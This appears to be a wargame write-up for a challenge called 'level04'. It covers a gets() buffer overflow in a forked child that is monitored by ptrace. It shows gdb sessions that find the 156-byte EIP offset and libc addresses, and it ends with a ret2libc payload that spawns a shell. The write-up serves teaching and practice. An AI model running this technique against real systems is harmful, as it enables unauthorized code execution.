Level04
-------

1) Understanding the program behavior

From the disassembly: Key observations:

The program calls fork()

 Child process → executes gets() (vulnerable)

 Parent process → monitors child with ptrace()



2) Important protections


1_ gets() → buffer overflow possible
call   gets@plt

➡️ No bounds checking → classic overflow


1_ ptrace() anti-exec protection
call   ptrace@plt

Later: cmp    $0xb, eax

➡️ 0xb = syscall number for execve

****** Meaning *******

If our shellcode calls /bin/sh → uses execve => Program detects it → kills process

Conclusion:
We CANNOT use classic shellcode (/bin/sh)
We must use open/read/write shellcode

3) finding the offset

(gdb) ./level04
(gdb) set follow-fork-mode child   (to switch to child process (the vulnerable one))
(gdb) run
Starting program: /home/users/level04/level04 
[New process 2125]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2125]
0x41326641 in ?? ()
(gdb) 


0x41326641 means 156 => so after 156 we control EIP

4) Let's Use existing libc functions

Our goal is : 

system("/bin/sh");
exit();

5) Let's find system :

(gdb) run
Starting program: /home/users/level04/level04 
Give me some shellcode, k
^C
Program received signal SIGINT, Interrupt.
0xf7fdb440 in __kernel_vsyscall ()


(gdb) info functions system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system
0xf7f48a50  svcerr_systemerr


6) Let's find exit :


(gdb) info function exit
All functions matching regular expression "exit":

Non-debugging symbols:
0xf7e5eb70  exit
0xf7e5eba0  on_exit
0xf7e5edb0  __cxa_atexit
0xf7e5ef50  quick_exit
0xf7e5ef80  __cxa_at_quick_exit
0xf7ee45c4  _exit
0xf7f27ec0  pthread_exit
0xf7f2d4f0  __cyg_profile_func_exit
0xf7f4bc30  svc_exit
0xf7f55d80  atexit


7) Let's find "/bin/sh" :

(gdb) info proc map
process 1834
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
	 0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
	 0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
	0xf7e2b000 0xf7e2c000     0x1000        0x0 
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0 
	0xf7fda000 0xf7fdb000     0x1000        0x0 
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]


Searching inside libc:


(gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
0xf7f897ec
1 pattern found.

8) Building the payload

[ padding (156 bytes) ]
[ system address ]
[ return address → exit ]
[ argument → "/bin/sh" ]

(python -c 'print "B"*156+"\xd0\xae\xe6\xf7"+"\x70\xeb\xe5\xf7"+"\xec\x97\xf8\xf7"'; cat) | ./level04